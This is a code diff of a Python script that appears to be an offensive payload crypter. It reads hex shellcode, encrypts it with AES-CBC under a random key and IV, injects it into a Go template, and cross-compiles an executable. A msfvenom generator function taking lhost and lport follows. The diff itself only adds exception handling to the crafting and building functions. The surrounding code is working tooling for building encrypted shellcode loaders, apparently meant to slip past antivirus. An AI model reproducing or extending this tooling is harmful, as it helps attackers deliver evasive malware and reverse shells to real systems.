@@ -89,52 +89,59 @@ def safechecks(appdir):
 
 	
 def craftbinary(shellcodefile,outputdir,biname,appdir):
-	
-	print("[+] Using",colored("{0}".format(shellcodefile),"green"),"as hex shellcode ...")
-	# read template GO file
-	if not os.path.isfile(shellcodefile):
-		cprint("[-] Shellcode file doesn't exist ! Exiting", "red")
-		sys.exit()
-	with open(shellcodefile,'r') as f:
-		shellcode = f.read()
-	
-	# replace values
-	with open('{0}/src/main.go'.format(appdir),'r') as f:
-		content_go = f.read()
+	try:
+		print("[+] Using",colored("{0}".format(shellcodefile),"green"),"as hex shellcode ...")
+		# read template GO file
+		if not os.path.isfile(shellcodefile):
+			cprint("[-] Shellcode file doesn't exist ! Exiting", "red")
+			sys.exit()
+		with open(shellcodefile,'r') as f:
+			shellcode = f.read()
+		
+		# replace values
+		with open('{0}/src/main.go'.format(appdir),'r') as f:
+			content_go = f.read()
 
-	key = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(16))
-	iv = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(16))
-	shellcode_encrypt = encrypthat(key,iv,shellcode)
-	
-	key = str(binascii.hexlify(key.encode()).decode('utf-8'))
-	iv = str(binascii.hexlify(iv.encode()).decode('utf-8'))
-	shellcode_encrypt = str(binascii.hexlify(shellcode_encrypt).decode('utf-8'))
+		key = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(16))
+		iv = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for x in range(16))
+		shellcode_encrypt = encrypthat(key,iv,shellcode)
+		
+		key = str(binascii.hexlify(key.encode()).decode('utf-8'))
+		iv = str(binascii.hexlify(iv.encode()).decode('utf-8'))
+		shellcode_encrypt = str(binascii.hexlify(shellcode_encrypt).decode('utf-8'))
 
-	# print(key,iv,shellcode_encrypt)
-	print("[+] Using",colored("AES-CBC","yellow"),"with unique",colored("IV & KEY","yellow"),"to encrypt the shellcode ... ")
-	content_go = content_go.replace("_KEY_",key)
-	content_go = content_go.replace("_IV_",iv)
-	content_go = content_go.replace("_SHELLCODE_",shellcode_encrypt)
+		# print(key,iv,shellcode_encrypt)
+		print("[+] Using",colored("AES-CBC","yellow"),"with unique",colored("IV & KEY","yellow"),"to encrypt the shellcode ... ")
+		content_go = content_go.replace("_KEY_",key)
+		content_go = content_go.replace("_IV_",iv)
+		content_go = content_go.replace("_SHELLCODE_",shellcode_encrypt)
 
-	
-	# write tmp GO file with current values.
-	# will be use to "go build"
-	with open('{0}/{1}.go'.format(outputdir,biname),'w') as f:
-		f.write(content_go)
+		
+		# write tmp GO file with current values.
+		# will be use to "go build"
+		with open('{0}/{1}.go'.format(outputdir,biname),'w') as f:
+			f.write(content_go)
+	except Exception as e:
+		cprint("[-] An error occurred while crafting the binary : {0}".format(e), "red")
+
 
 def buildbinary(platform,arch,outputdir,biname):
 	# if not ".exe" in biname:
 	# 	biname += ".exe"
-	print("[+] Building binary for arch",colored("{0}".format(arch),"green"),"...")
-	cmdbuild = "GOOS={0} GOARCH={1} go build -o {2}/{3} {2}/{3}.go".format(platform,arch,outputdir,biname)
-	print("[+] Building:",colored("{0}".format(cmdbuild),"green"))
-	s = os.system(cmdbuild)
-	if s == 0:
-		print("[+] Go file is:", colored("{0}/{1}.go ".format(outputdir,biname),"green"))
-		print("[+] Binary file is:", colored("{0}/{1} ".format(outputdir,biname),"green"))
-	else:
-		cprint("[-] An error occurred while building the binary ...", "red")
-		sys.exit()
+	try:
+		print("[+] Building binary for arch",colored("{0}".format(arch),"green"),"...")
+		cmdbuild = "GOOS={0} GOARCH={1} go build -o {2}/{3} {2}/{3}.go".format(platform,arch,outputdir,biname)
+		print("[+] Building:",colored("{0}".format(cmdbuild),"green"))
+		s = os.system(cmdbuild)
+		if s == 0:
+			print("[+] Go file is:", colored("{0}/{1}.go ".format(outputdir,biname),"green"))
+			print("[+] Binary file is:", colored("{0}/{1} ".format(outputdir,biname),"green"))
+		else:
+			cprint("[-] An error occurred while building the binary ...", "red")
+			sys.exit()
+	except Exception as e:
+		cprint("[-] An error occurred while building the binary : {0}".format(e), "red")
+
 
 
 def msfvenom_generator(platform,arch,shellcodedir,shellcodename,lhost,lport,msfparams):	
